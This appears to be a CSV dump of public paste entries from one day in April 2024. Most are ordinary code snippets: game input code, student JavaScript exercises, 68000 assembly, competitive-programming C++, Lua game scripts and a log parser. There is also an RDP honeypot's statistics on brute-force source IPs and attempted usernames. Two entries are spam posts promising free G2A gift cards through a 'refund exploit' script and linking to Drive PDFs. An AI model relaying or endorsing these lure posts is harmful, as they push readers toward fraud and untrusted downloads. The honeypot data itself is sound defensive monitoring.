id,title,username,language,date,content
xSmm2QWg,2024-04-04_stats.json,rdp_snitch,JSON,Thursday 4th of April 2024 07:15:09 PM CDT,"{
  ""ip"": {
    ""45.227.254.54"": 2,
    ""81.19.135.47"": 3,
    ""103.57.220.167"": 1,
    ""39.105.102.119"": 3,
    ""58.218.204.183"": 3,
    ""142.4.218.114"": 1,
    ""45.227.254.9"": 4,
    ""213.32.39.44"": 1,
    ""205.210.31.254"": 3,
    ""87.251.75.145"": 4,
    ""159.65.111.44"": 4,
    ""104.237.141.80"": 1,
    ""112.4.139.162"": 2,
    ""194.28.115.243"": 3,
    ""185.170.144.3"": 2,
    ""159.89.238.156"": 4,
    ""64.225.40.165"": 1,
    ""205.210.31.143"": 3,
    ""194.165.16.37"": 2,
    ""103.149.27.222"": 2,
    ""116.140.196.215"": 1,
    ""38.255.43.130"": 6,
    ""198.135.49.131"": 1,
    ""96.8.115.25"": 1,
    ""91.238.181.16"": 2,
    ""205.210.31.98"": 3,
    ""212.70.149.146"": 1,
    ""196.190.117.7"": 1,
    ""199.45.154.23"": 1,
    ""62.204.41.222"": 2,
    ""103.20.97.235"": 2,
    ""80.94.95.121"": 6,
    ""205.210.31.244"": 3,
    ""92.51.2.11"": 1,
    ""52.149.219.213"": 1
  },
  ""asn"": {
    ""AS267784"": 6,
    ""AS209588"": 4,
    ""AS135905"": 1,
    ""AS37963"": 3,
    ""AS4134"": 3,
    ""AS16276"": 2,
    ""AS396982"": 12,
    ""AS208091"": 4,
    ""AS14061"": 9,
    ""AS63949"": 1,
    ""AS56046"": 2,
    ""AS50968"": 3,
    ""AS197414"": 2,
    ""AS48721"": 2,
    ""AS135377"": 2,
    ""AS4837"": 1,
    ""AS213122"": 6,
    ""AS396073"": 1,
    ""AS36352"": 1,
    ""AS49434"": 2,
    ""AS204428"": 7,
    ""AS24757"": 1,
    ""AS398722"": 1,
    ""AS59425"": 2,
    ""AS150880"": 2,
    ""AS8075"": 1
  },
  ""isp"": {
    ""Flyservers S.A."": 12,
    ""INET"": 1,
    ""Hangzhou Alibaba Advertising Co"": 3,
    ""Chinanet"": 3,
    ""OVH SAS"": 2,
    ""Google LLC"": 12,
    ""Xhost Internet Solutions LP"": 6,
    ""DigitalOcean, LLC"": 9,
    ""Akamai Technologies, Inc."": 1,
    ""China Mobile Communications Corporation"": 2,
    ""Hostmaster, Ltd."": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""China Unicom CHINA169 Network"": 1,
    ""Hyonix LLC"": 6,
    ""Majestic Hosting Solutions, LLC"": 1,
    ""HostPapa"": 1,
    ""Datacenter location PAR1 France"": 2,
    ""SS-Net"": 7,
    ""Ethiotelecom"": 1,
    ""Censys, Inc."": 1,
    ""Horizon LLC"": 2,
    ""Fast Byte Fast Data Company Limited"": 2,
    ""Microsoft Corporation"": 1
  },
  ""org"": {
    ""UAB Host Baltic"": 6,
    ""Alviva Holding Limited"": 4,
    ""iNET Media Company Limited"": 1,
    ""Aliyun Computing Co., LTD"": 3,
    ""Chinanet JS"": 3,
    ""OVH Hosting, Inc."": 1,
    ""ONYPHE"": 1,
    ""Palo Alto Networks, Inc"": 12,
    ""Xhost Internet Solutions"": 4,
    ""DigitalOcean, LLC"": 5,
    ""Linode"": 1,
    ""China Mobile Communications Corporation"": 2,
    ""Network Systems Ltd"": 3,
    ""Xhostis"": 2,
    ""Digital Ocean"": 4,
    ""Flyservers S.A"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""China United Network Communications Corporation Limited"": 1,
    ""Hyonix LLC"": 6,
    ""Majestic Hosting Solutions, LLC"": 1,
    ""Michael Charlery"": 1,
    ""ThinkTech Technology Industrial CO. Limited"": 2,
    ""4Media Ltd"": 1,
    ""Unknown"": 1,
    ""Censys, Inc."": 1,
    ""Horizon LLC"": 2,
    ""FASTBYTE"": 2,
    ""Unmanaged LTD"": 6,
    ""Microsoft Azure Cloud (eastus)"": 1
  },
  ""regionName"": {
    ""Vilnius"": 6,
    ""Hesse"": 4,
    ""Hanoi"": 1,
    ""Beijing"": 4,
    ""Jiangsu"": 5,
    ""Quebec"": 1,
    ""Hauts-de-France"": 1,
    ""California"": 23,
    ""North Holland"": 9,
    ""Texas"": 3,
    ""New Jersey"": 4,
    ""Kaunas"": 2,
    ""Kowloon"": 2,
    ""\u00cele-de-France"": 2,
    ""Sliven"": 1,
    ""Addis Ababa"": 1,
    ""New York"": 1,
    ""Moscow"": 2,
    ""Ho Chi Minh"": 2,
    ""Budapest"": 6,
    ""Virginia"": 1
  },
  ""country"": {
    ""Lithuania"": 8,
    ""Germany"": 4,
    ""Vietnam"": 3,
    ""China"": 9,
    ""Canada"": 1,
    ""France"": 3,
    ""United States"": 32,
    ""The Netherlands"": 9,
    ""Hong Kong"": 2,
    ""Bulgaria"": 1,
    ""Ethiopia"": 1,
    ""Russia"": 2,
    ""Hungary"": 6
  },
  ""account"": {
    ""Test"": 10,
    ""Domain"": 9,
    ""hello"": 19,
    ""Administrator"": 2,
    ""Administr"": 13,
    ""LAzMmQvWO"": 1,
    ""RUzuvF"": 1,
    ""fvMDbb"": 1,
    ""py7rg35i"": 4,
    ""beio"": 2,
    ""(empty)"": 5,
    ""rkakzxjj"": 4,
    ""sjLzaDNbs"": 1,
    ""JRAEdR"": 1,
    ""zlUxGk"": 1,
    ""QLwdasv"": 1,
    ""PVqnzEmBs"": 1,
    ""bRQrgf"": 1,
    ""OBbZkd"": 1,
    ""jZLppxquX"": 1,
    ""bBxsax"": 1,
    ""hoXVgA"": 1
  },
  ""keyboard"": {
    ""Unknown"": 81
  },
  ""client_build"": {
    ""Unknown"": 81
  },
  ""client_name"": {
    ""Unknown"": 81
  },
  ""ip_type"": {
    ""Unknown"": 42,
    ""hosting"": 29,
    ""hosting & proxy"": 8,
    ""mobile"": 2
  }
}"
6V7x5zv3,Untitled,imk0tter,C++,Thursday 4th of April 2024 06:56:30 PM CDT,"void IN_MouseMove ( float frametime, usercmd_t *cmd)
{
	int		mx, my;
	vec3_t viewangles;

	double mouse_x2, mouse_y2;

	gEngfuncs.GetViewAngles( (float *)viewangles );

	// Ricochet: Don't let them move the mouse when they're in spectator mode
	int iSpectator = !bCanMoveMouse();

	//jjb - this disbles normal mouse control if the user is trying to 
	//      move the camera
	if ( !iMouseInUse && !g_iVisibleMouse && !iSpectator )
	{
		GetCursorPos (&current_pos);
		IN_ResetMouse();

		mx = (current_pos.x - gEngfuncs.GetWindowCenterX());
		my = (current_pos.y - gEngfuncs.GetWindowCenterY());
		if (cl_acceleration->value == 0) 
		{
				mouse_x2 = TRANSFORM_ORB_PIXELS_TO_DEGREES(mx, SCREEN_WIDTH, gHUD.m_iFOV, sensitivity->value);
				mouse_y2 = TRANSFORM_ORB_PIXELS_TO_DEGREES(my, SCREEN_HEIGHT, gHUD.m_iFOV, sensitivity->value);
		}
		else
		{
				mouse_x2 = mx == 0 ? 0 : TRANSDUCE_PIXELS_TO_DEGREES(mx, SCREEN_WIDTH, gHUD.m_iFOV, sensitivity->value);
				mouse_y2 = my == 0 ? 0 : TRANSDUCE_PIXELS_TO_DEGREES(my, SCREEN_HEIGHT, gHUD.m_iFOV, sensitivity->value);
		}
		// add mouse X/Y movement to cmd
		if ((in_strafe.state & 1) || (lookstrafe->value && (in_mlook.state & 1)))
		{
			cmd->sidemove += mouse_x2;
			//cmd->sidemove += m_side->value * mouse_x;
		}
		else
		{
			viewangles[YAW] -= mouse_x2;
			//viewangles[YAW] -= m_yaw->value * mouse_x;
		}
		if ( in_mlook.state & 1)
		{
			V_StopPitchDrift ();
		}
		
		if ( (in_mlook.state & 1) && !(in_strafe.state & 1))
		{
			viewangles[PITCH] += mouse_y2;

			//viewangles[PITCH] += m_pitch->value * mouse_y;
			if (viewangles[PITCH] > cl_pitchdown->value)
			{
				viewangles[PITCH] = cl_pitchdown->value;
			}
			if (viewangles[PITCH] < -cl_pitchup->value)
			{
				viewangles[PITCH] = -cl_pitchup->value;
			}
		}
		else
		{
			if ((in_strafe.state & 1) && gEngfuncs.IsNoClipping() )
			{
				cmd->upmove -= mouse_y2;
				//cmd->upmove -= m_forward->value * mouse_y;
			}
			else
			{
				cmd->forwardmove -= mouse_y2;
				//cmd->forwardmove -= m_forward->value * mouse_y;
			}
		}
	}

	gEngfuncs.SetViewAngles( (float *)viewangles );

/*
//#define TRACE_TEST
#if defined( TRACE_TEST )
	{
		int mx, my;
		void V_Move( int mx, int my );
		IN_GetMousePos( &mx, &my );
		V_Move( mx, my );
	}
#endif
*/
}
"
KEESVhZn,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 🤑,ssss50w,GetText,Thursday 4th of April 2024 06:45:52 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
 
 
Working as of:
05 April 2024"
0xGmvb46,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 🤑,jusst2k4,GetText,Thursday 4th of April 2024 06:36:45 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_766856.pdf

Working as of:
04 April 2024"
KjkKtbRU,6.Format the Text,Silviya7,JavaScript,Thursday 4th of April 2024 06:34:37 PM CDT,"function solve() {

  const Inputtext= document.querySelector('#input').value;
  const Outputttext= document.querySelector('#output');
  const ArrSentence= Inputtext.split('.');

  let counts=0;
  let NewArr=[];

  for (const el of ArrSentence) {
     
    let isString=false;
    const innerArr= el.split(' ');
    for (const el2 of innerArr) {
      if(typeof el2== 'string' && el2 !=''){
        counts++;
        isString= true;
        break;
        
      }
    }
    if(isString){
      NewArr.push(el);
    }
   
  }

  let AllNewText='';
  let currentsen='';
  let countsent=0;
  let NewArrwithgroup=[];

  for (let i = 0; i < NewArr.length; i++) {
    countsent++;
    if( countsent %3==0){
      currentsen +=NewArr[i]+'.'
      NewArrwithgroup.push(`<p>${currentsen.trim()}</p>`);
      currentsen='';
      countsent=0;
    }
    else{
      currentsen +=NewArr[i]+'. '
    }
   
  }

  if(currentsen !=''){
    NewArrwithgroup.push(`<p>${currentsen.trim()}</p>`);
  }
  let result=NewArrwithgroup.join('\n');
  Outputttext.innerHTML=result;
}"
UbA37bCZ,spr2024 postponed as hell,glokyfull,Motorola 68000 HiSoft Dev,Thursday 4th of April 2024 06:25:15 PM CDT,"
;
; routine de sprite jamais fini
; taille quelquonque
; 2 plan masqué sur 2 plan
;
;
;
;


	BSS
*
maskW	ds.w 1
maskB	ds.w 1
motif	ds.w 2
*
largeurSprite	ds.w 1
hauteurSprite	ds.w 1
adrsprite	ds.l 1

listmask

	DATA


	TEXT

createCodeGen
	move.l adrsprite,a0
	lea spritebuffer,a1
	move.w largeurSprite,d0
	move.w hauteurSprite,d1
	moveq #0,d4
.copySprite
	move.w d1,d6
	subq.w #1,d6
.loopLigne
	move.w d0,d7
	subq #1,d7
.loopLarg
	move.l (a0)+,d2		; plan 0 plan 1
	move.l d2,(a1)+
	dbf d7,.loopLarg
	move.l d4,(a1)+
	dbf d6,.loopLigne

	lea spritebuffer,a0
	jsr makecodeGen

	jsr rollingSprite




rollingSprite
	lea spritebuffer,a0
	move.w largeurSprite,d2
	add d2,d2
	add d2,d2
	addq.w #4,d2		; +1

	move.w hauteursprite,d1
	subq #1,d1
	move.l a0,a1
.loopligne
	move.w largeurSprite,d0
	;subq #1,d0
	move.b #0,ccr
.looprolplan0
	roxr (a0)
	lea 4(a0),a0
	dbf d0,.looprolplan0

	lea 2(a1),a0			; selection plan 2
	move.w largeurSprite,d0
	move.b #0,ccr
.looprolplan1
	roxr (a0)
	lea 4(a0),a0
	dbf d0,.looprolplan1

	add d2,a1
	move.l a1,a0
	dbf d1,.loopligne
	rts

makecodeGen
	; analyse des masque
	move.w hauteursprite,d0
	move.w largeursprite,d1
	add.w d1,d1
	add.w d1,d1
	

	lea maskW,a5
	lea spritebuffer,a0
	move.l a0,a1
	lea listemaskcol,a1
	move.w hauteursprite,d0
	subq.w #1,d0
	moveq #0,d4
.loopmask
	move.w (a0)+,d2
	move.w d2,4(a5)		motif
	move.w (a0)+,d3
	move.w d3,6(a5)
	or.w d3,d2
	move.w d2,(a5)

	
	move.w d4,(a1)+			; numero de masque
	move.w d2,(a1)+		;   masque ajoute a la liste des masque nb ligne fois
	addq.w #1,d4
	add d1,a0
	dbf d0,.loopmask
	move.w #-1,(a1)+	; marqueur de fin
	move.w #0,(a1)+


	move.w hauteursprite,d0
	subq.w #1+1,d0
	lea listemaskcol,a1
	move.l a1,a2
	lea listeoccurmask,a3

	listeposmask,a4

	move.w (a1),d4 		;et pas (a1)+   ; numero de masque
	move.w 2(a1),d2 	; masque

	moveq #0,d5
.search
	move.w (a1)+,d4			; numero de masque
	tst.w d4 
	bmi.s .suite
	move.w (a1)+,d3			; masque
	cmp.w d2,d3
	bne.s .1
	move.w d4,(a4)+			; numero dans la liste qu'il faudra enlever
	move.w #$4e71,-4(a1)	; on met un marqueur dans la liste numero de masque, masque
	addq.w #1,d5			; nombre d'occurence du masque
.1	
	bra.s .search
.suite
	move.w #-1,(a4)+
; dans a4: liste numero de masque semblable le numero de masque seulement
; dans d2: masque

; on compare le nombre d'occurence
	cmp.w #3,d5
	bgt.s .2
; ici d5>3 iteration de masque
	
.2
	bsr testmaskd2
	lea listeposmask,a4
; retire de la liste des masque
	lea listemaskcol,a1
.boucle1

	move.w (a4)+,d4
	tst.w d4
	bmi.s .suite2			
	move.w (a1)+,d5
	addq.l #2,a1
	cmp.w d4,d5
	beq.s .suprime
	bra.s .boucle1
.suprime

	move.l a1,a3
	lea -4(a1),a1
	move.l a1,a5
.3	move.w (a3)+,d7
	tst.w d7
	bmi.s .termine
	swap d7
	move.w (a3)+,d7

	move.l d7,(a1)+
	bra.s .3
.termine
	move.l #$FFFF0000,(a1)+
	move.l a5,a1
	bra.s .boucle1
.suite2


clearoccurence4e71
	lea listemaskcol,a1
	move.l a1,a2
.loop
	move.w (a2)+,d0
	tst.w d0
	bmi.s .finloop
	move.w (a2)+,d1
	cmp.w #$4e71,d0
	bne.s .1
.0	move.w (a2)+,d0
	bmi.s .finloop
	move.w (a2)+,d1
	cmp.w #$4e71,d0
	beq.s .0
.1	move.w d0,(a1)+
	move.w d1,(a1)+
	bra.s .loop
.finloop
	move.l #$FFFF0000,(a1)+
	rts




testmaskd2
	move.w d2,d3		; d3 = masque
	not.w d3			; not mask
	tst.w d3			; mask = FFFF ? <=> not mask = 0
	beq.s .labelFFFF
	not.w d3			,not not mask = mask
	move.w d3,d6
	tst.b d3			; XX00
	beq.s .labelaa00
	; d3.b contient quelquechose
	rol.w #8,d3
	tst.b d3
	beq.s .label00aa
	move.w d6,d3

.labelaabb
	; and.l #maskmask,dep(a0)		; separable
	; or.l #orvalue,dep(a0)
	st.b flagMaskLong
	sf.b flagMaskWord
	st.b separable
	sf.b nomask
	rts
.labelaa00
	cmp.w #$FF00,d3
	beq.s .labelFF00
	; movep.w dep(a0),d6
	; and.w #valueFF,d6
	; or.w #value00,d6
	; movep.w d6,dep(a0)
	sf.b flagMaskLong
	st.b flagMaskWord
	sf.b separable			; n'est pas separable du bitmap a or-é
	sf.b nomask
	rts
.labelFF00
	; no mask
	move.w #valuevalue,d6
	movep.w d6,dep(a0)
	st.b nomask
	rts
.label00aa
	move.w d6,d3
	cmp.w #$00FF,d3
	beq.s .label00FF
	 movep.w dep+1(a0),d6
	 and.w #aaaa,d6
	 or.w #value,d6
	 movep.w d6,dep+1(a0)
	 st.b flagMaskWord
	 sf.b flagMaskLong
	 sf.b separable
	 sf.b nomask

	rts
.label00FF
	; move.w #aaaa,d6
	; movep.w d6,1+dep(a0)
	
	

	move.w d6,d3
	and.w #$00FF,d3
	tst.w d3
	beq.s .labelFF00
.other
	; masquage normal (?)
	cmp.w #3,d4			; nombre d'occurence >=3 occurence ?
	bsr serialmasquage
	bra.s .suite
	
.labelFFFF
	; move.l #value,dep(a0), pas de masquage donc on oublie les masque
.label00FF
	move.w #valuevalue,d6
	movep.w d6,dep+1(a0)		; pas de masquage non plus
.labelFF00
	move.w #valuevalue,d6
	movep.w d6,dep(a0)
	
	
"
B0jv7W4B,Untitled,Zeinab_Hamdy,C++,Thursday 4th of April 2024 05:43:55 PM CDT,"#include<bits/stdc++.h>
using namespace std;
#define nl ""\n""
#define fi first
#define se second
#define pb push_back
#define ll long long
#define ull unsigned ll
#define RV  return void
#define sz(x) int(x.size())
#define all(v) v.begin(), v.end()
#define rall(v) v.rbegin(), v.rend()
#define fixed(n) fixed << setprecision(n)
#define cin(v) for (auto&i:v) cin >> i;
#define cout(v) for (auto&i:v) cout << i << "" "";
#define clr(memo, x) memset(memo, x, sizeof memo)
#define FastCode ios_base::sync_with_stdio(false); cin.tie(nullptr); cout.tie(nullptr);
 
void  Zainab(){
            // #ifndef ONLINE_JUDGE
              // freopen(""hobz.in"", ""r"", stdin);
              // freopen(""longpath.out"", ""w"", stdout);
            // #endif
}


void myCode( ){

ll n ;
    cin >>n ;
    vector < ll > v(n) , pref(n+1,1 ) , suff(n+1,1);
    cin(v);
    
    for(int i=0 ; i < n ; i++){
        pref[i] = v[i];
        if(i) pref[i] = __gcd(pref[i-1] , pref[i]);
    }
    
    for(int i=n-1 ;i >=0 ; i--){
        suff[i] = v[i];
        if(i != n-1) 
            suff[i] = __gcd(suff[i+1] , suff[i]);
    }
    
    ll ans=1;
    map < ll , ll > saved;
    for(int i =0; i < n ; i++){
        ll tx = suff[i+1];
        if(i)
            tx = pref[i-1];
        
        ll gc = __gcd( tx , suff[i+1]) 
        , gc2 = __gcd(v[i] , gc)
        , fin = gc/gc2
        , mx =1;
        
        
        if(saved[fin]) 
            mx = saved[fin];
        
        else{
            for(ll j =2 ; j*j <= fin ; j+= 1 + (j &  1)){
                if(fin % j == 0){
                    mx = max(mx , j);
                    
                    while(fin % j ==0)
                        fin/=j;
                }
            }
                 
            if( fin > 1)
                mx = max(mx , fin);
        }
       
        saved[gc/ gc2] = mx;
        ans = max(ans , __gcd(gc , mx*gc2));
            
            // cout << i << "" "" << gc << "" "" << gc2 << "" "" << mx << nl;
    }
    
   


    cout << ans << nl;

    
}
 
 
int main(){
                                   FastCode ;

    int testCase=1;
          cin >> testCase ;
      for(int i=1 ; i<= testCase ; i++)
        myCode();
 
    return 0;
}"
0XU3TtqD,[App] autoRefuel.lua,Le_JuiceBOX,Lua,Thursday 4th of April 2024 05:04:54 PM CDT,"-- 0XU3TtqD
local Terminal = require(""/terminal"").new()
local diff = 0
function Main()
    writeText()
    repeat
        Terminal:reset()  
        writeText()
        local res = Terminal:promptConf(""Auto-refuel turtle?"",true)
        if res then
            turtle.select(1)
            repeat
                local isFull = (turtle.getFuelLevel() >= turtle.getFuelLimit())
                if isFull == false then
                    for i = 1, 16 do
                        turtle.select(i)
                        turtle.suckUp()
                    end
                
                    for i = 1, 16 do
                        turtle.select(i)
                        turtle.refuel()
                        turtle.dropDown()
                        writeText()
                    end
                end
            until isFull
        else
            return
        end
        turtle.select(1)
        writeText()
        Terminal:print()
        Terminal:pressAnyKeyToContinue()
    until res == false
end

function writeText()
    local fuelLevel = turtle.getFuelLevel()
    local fuelLimit = turtle.getFuelLimit()
    local fuelPercent = math.floor((fuelLevel/fuelLimit)*100)
    diff = fuelLimit - fuelLevel
    Terminal:reset()
    Terminal:print(""Turtle fuel level:"")
    Terminal:print()
    Terminal:print(tostring(fuelLevel.."" / ""..fuelLimit.."" &8(""..fuelPercent..""%)""))
    Terminal:print()
    Terminal:print(""Lava Buckets&8..&0x""..math.ceil(diff/1000))
    Terminal:print(""Coal&8..........&0x""..math.ceil(diff/160))
    Terminal:print(""Kelp&8..........&0x""..math.ceil(diff/100))
    Terminal:print()
end

Main()"
b5kk03sn,Untitled,retroman,FreeBasic,Thursday 4th of April 2024 04:42:20 PM CDT,"dim as string mystr = ""hello world""
	for i as integer = 1 to 50 step 1
	color 4
		print "" ""+mystr
		sleep 20
		locate 1,abs(i)+1,0
	next
color 7"
Br1FHXRB,JG X ESX_PROPERTY,Lindholmbrahe,Lua,Thursday 4th of April 2024 04:39:29 PM CDT,"RegisterNetEvent('esx_property:server:createProperty', function(Property)
  local source = source
  local xPlayer = ESX.GetPlayerFromId(source)
  local Interior = GetInteriorValues(Property.interior)
  local garageData =
    Property.garage.enabled and {enabled = true, pos = Property.garage.pos, Heading = Property.garage.heading, StoredVehicles = {}} or
      {enabled = false}
  if IsPlayerAdmin(source, ""CreateProperty"") then
    local ActualProperty = {
      Name = Property.name, 
      setName = """", 
      Price = Property.price, 
      furniture = {}, 
      plysinside = {}, 
      Interior = Property.interior,
      Entrance = Property.entrance, 
      Owner = """", 
      Keys = {}, 
      positions = Interior.positions, 
      cctv = Property.cctv,
      garage = garageData, 
      Owned = false, 
      Locked = false
                          }
    Properties[#Properties + 1] = ActualProperty
    local owners = {
      {
      identifier = xPlayer.getIdentifier(),
      name = xPlayer.getName(),
      id = source
      }
    }
    MySQL.Async.execute(""INSERT INTO player_priv_garages (owners, name, type, x, y, z, h, distance) VALUES (@owners, @type, @name, @x, @y, @z, @h, @distance)"",
      {[""@owners""] = json.encode(owners), [""@type""] = ""private"", [""@name""] = Property.name, [""@x""] = Property.garage.pos.x, [""@y""] = Property.garage.pos.y,
       [""@z""] = Property.garage.pos.z, [""@h""] = Property.garage.heading, [""@distance""] = 10}, function()
      end)

  end
  Log(""Property Created"", 65280,
    {{name = ""**Admin**"", value = xPlayer.getName(), inline = true}, {name = ""**Name**"", value = Property.name, inline = true},
     {name = ""**Price**"", value = ESX.Math.GroupDigits(Property.price), inline = true},
     {name = ""**Interior**"", value = Interior.label, inline = true},
     {name = ""**Garage Status**"", value = Property.garage.enabled and ""Enabled"" or ""Disabled"", inline = true},
     {name = ""**CCTV Status**"", value = Property.cctv.enabled and ""Enabled"" or ""Disabled"", inline = true},
     {name = ""**Entrance**"", value = tostring(Property.entrance.x .. "", "" .. Property.entrance.y .. "", "" .. Property.entrance.z), inline = true}}, 1)
  TriggerClientEvent(""esx_property:syncProperties"", -1, Properties)
end)"
RxUyMA33,5.Table - Search Engine,Silviya7,JavaScript,Thursday 4th of April 2024 04:26:22 PM CDT,"function solve() {
   document.querySelector('#searchBtn').addEventListener('click', onClick);

   function onClick() {
      //   TODO:
  const listTr= document.querySelectorAll('table.container tbody tr');
  const searchfield= document.querySelector('#searchField');

  for (const trel of listTr) {
   
   const listv=trel.querySelectorAll('td');
   let issearched= false;

   trel.className='';
   for (const el of listv) {
      
     if(el.textContent.toLowerCase().includes(searchfield.value) ){
      issearched= true;
      break;
     }
   }
   if(issearched ==true){
      trel.className='select';
   }
  }
   }
}"
EHPbbwWK,Untitled,juunitaki,Python,Thursday 4th of April 2024 03:46:31 PM CDT,"""""""
Подсчет количества нечетных чисел на отрезке [a; b] (включая a и b)
""""""

def overkill_count(a, b):
    """"""Решение перебором.""""""
    c = 0
    for i in range(a, b+1):
        if i % 2 == 1:
            c = c + 1
    return c

def smart_count(a, b):
    """"""Решение по формуле.""""""

    # найдем первое нечетное число, больше или равное ""a""
    if a % 2 == 1:
        a = a
    else:
        a = a + 1

    # найдем первое нечетное число, меньшее или равное ""b""
    if b % 2 == 1:
        b = b
    else:
        b = b - 1

    # теперь a и b - минимальное и максимальное нечетные числа внутри отрезка
    # их разность делится на 2
    # и нужно прибавить 1
    return (b-a)//2 + 1

# переберем кучу ""a"" и ""b"", чтобы сравнить два решения для разных исходных данных
for a in range(0, 10):
    for b in range(a, 20):
        if smart_count(a, b) != overkill_count(a, b):
            # если два решения не совпадают - это проблема
            print(f""problem with {a} and {b}"")
        else:
            # распечатаем результат
            print(a, b, smart_count(a, b))"
dNZ8CyHb,Среднее арифметическое оценок,plarmi,Python,Thursday 4th of April 2024 03:41:50 PM CDT,"summ = 0
counter = 0

number = int(input(""Введите оценку от 1 до 12, 0 - прекратить ввод: ""))
while number != 0:
    summ += number
    counter += 1
    number = int(input(""Введите оценку от 1 до 12, 0 - прекратить ввод: ""))
print(summ / counter)
    "
22WUxxfG,hack tabs,KukuRuzo,C++,Thursday 4th of April 2024 03:25:43 PM CDT,"diff --git a/src/widgets/psitabbar.cpp b/src/widgets/psitabbar.cpp
index c674d142..662b94f5 100644
--- a/src/widgets/psitabbar.cpp
+++ b/src/widgets/psitabbar.cpp
@@ -26,6 +26,10 @@
 #include <QMimeData>
 #include <QMouseEvent>
 #include <QPainter>
+#if QT_VERSION >= QT_VERSION_CHECK(6, 0, 0)
+#include <QMetaProperty>
+#include <QStyleOptionTab>
+#endif
 
 /**
  * Constructor
@@ -37,6 +41,19 @@ PsiTabBar::PsiTabBar(PsiTabWidget *parent) : TabBar(parent)
     setMovable(true);
     setTabsClosable(true);
     setSelectionBehaviorOnRemove(QTabBar::SelectPreviousTab);
+//Hack to place Qt6 tabs not at center with minimal tab width
+#if QT_VERSION >= QT_VERSION_CHECK(6, 0, 0)
+    setExpanding(false);
+    auto propName = ""position"";
+    auto *metaObject = PsiTabBar::metaObject();
+    int count = metaObject->propertyCount();
+    for (int i = 0; i < count; ++i) {
+        if(std::strcmp(metaObject->property(i).name(), propName)) {
+            setProperty(propName, QStyleOptionTab::Beginning);
+            break;
+        }
+    }
+#endif
 }
 
 /**
"
dSeZge2g,Explicacion Parametros Users y otros,XConquer,C#,Thursday 4th of April 2024 03:23:08 PM CDT,"Bueno Primero, donde estan los codigos que se Resetean cada dia, por ejemplo el Uso de ExpBalls, Buscaremos 
public static unsafe void Reset(Extensions.Time32 Clock) o public static void ResetingEveryDay(Client.GameClient client), por si las dudas es Bueno agregar nuestro codigo en los 2 ya que aveces se leen ambos

Ahi veremos todos los codigos y variables que se Resetean al Finalizar el dia.
y por ejemplo podemos agregar nuestro codigo asi :
client.Player.ReclamarPremio = 0;
================================================================
Ahora, Para Agregar uno es bastante Simple

1.- Role/Player.cs, Agregaremos un codigo nuestro ejemplo :
public uint ReclamarPremio;

2.- Nos vamos a ServerDatabase o Buscamos write.Write<ushort>(""Character"", ""Level"", client.Player.Level); para encontrar mas facil donde Pegar nuestro Codigo anteriormente creado
   write.Write<uint>(""Character"", ""Premio"", client.Player.ReclamarPremio);
a tener en cuenta que nuestro codigo debe ser igual al que creamos, es decir no podemos setear un int de un uint write.Write<uint>, eso no lo podemos poner en int , si no se leera de forma diferente.

3.- Buscaremos : public static void LoadCharacter(Client.GameClient client, uint UID) y Agregaremos nuestro codigo de nuevo al final o casi al final
client.Player.ReclamarPremio = reader.ReadUInt32(""Character"", ""Premio"", 0); //el 0 al final es el default que tendra el Archivo Users.ini. y como puedes ver tambien se debe poner el tipo de Read del codigo.
Con eso finalizamos el como setear un nuevo parametro en los archivos de USERS.

A TENER EN CUENTA : el Nuevo parametro aparecera automaticamente en Nuevos Jugadores, en el caso de viejos se puede de 2 formas 1 manualmente, ir al archivo al final y agregarlo o se agregara forzadamente al Momento de Usar el sistema que lo Emplee o requiera.

======================================================================
Ahora NpcHandler, poner que nuestro parametro sea 1 y poner que el Jugador no pueda pasar de dicho parametro si no es nuevo dia.
  [NpcAttribute(NpcID.ReclamarPremio)]
        public static void Premio(Client.GameClient client, ServerSockets.Packet stream, byte Option, string Input, uint id)
        {
            Dialog data = new Dialog(client, stream);
            switch (Option)
            {
                case 0:
                    {

                        data.Text(""Hola Bienvenidos a XECONQUER, Por favor reclama tu Premio, recuerda que solo Puedes hacer 1 vez al Dia"");
                        data.Option(""Reclamar."", 1);
                        data.Option(""No quiero nada."", 255);
                        data.AddAvatar(10).FinalizeDialog();
                        break;
                    }
               
                case 1:
                    {
                        
                        if (client.Player.ReclamarPremio == 0)//Requerimiento 0 para poder reclamar, si es mayor a este no podra.
                        {
                           client.Player.ReclamarPremio += 1;//Setear de 0 a 1
			   client.Player.ConquerPoints += 100000;
                           
                        }
                        else
                        {
                            data.Text(""Ya has Reclamado tu Premio Hoy, Vuelve Mañana."");
                            data.Option(""Ok."", 255);
                            data.AddAvatar(10).FinalizeDialog();
                        }

                        break;
                    }
             

            }
        }
=======================================================
Tiene Multiples Usos, el mas comun es atraves de Npcs, pero tambien puede setearlo si matan un Boss que no de ciertos premios si el parametro es 0 o 1, en torneos, etc etc
el uso variara dependiendo de lo que Busques Realizar."
mbwUumi1,Untitled,den4ik2003,Python,Thursday 4th of April 2024 03:13:31 PM CDT,"def parse_events(path_to_logs):
    list_of_events_dicts = []
    count_of_decode_errors = 0
    
    with open(path_to_logs, 'r') as logs:
        rows = logs.readlines()
        for i in range(len(rows)):
            if re.search('Account order event', rows[i]):
                if i + 1 < len(rows):
                    try:
                        event = json.loads(re.sub(r'(LIMIT_MAKER"")', r'\1,', rows[i+1][1:].strip()))
                        if type(event) is dict:
                            list_of_events_dicts.append(event)
                    except json.JSONDecodeError:
                        count_of_decode_errors += 1
    
    return (list_of_events_dicts, count_of_decode_errors)


def create_events_csv(path_to_logs, name='mm_events.csv'):
    events, errors_count = parse_events(path_to_logs)
    print(f'events rows = {len(events)}; errors count = {errors_count}')
    
    df = pd.DataFrame(events)
    df.drop(['symbol', 'type', 'is_maker', 'average_price', 'filled_quantity'], axis=1, inplace=True)
    
    for float_column in ['amount', 'price', 'quantity']:
        df[float_column] = df[float_column].astype(float)
        
    for str_column in ['status', 'side']:
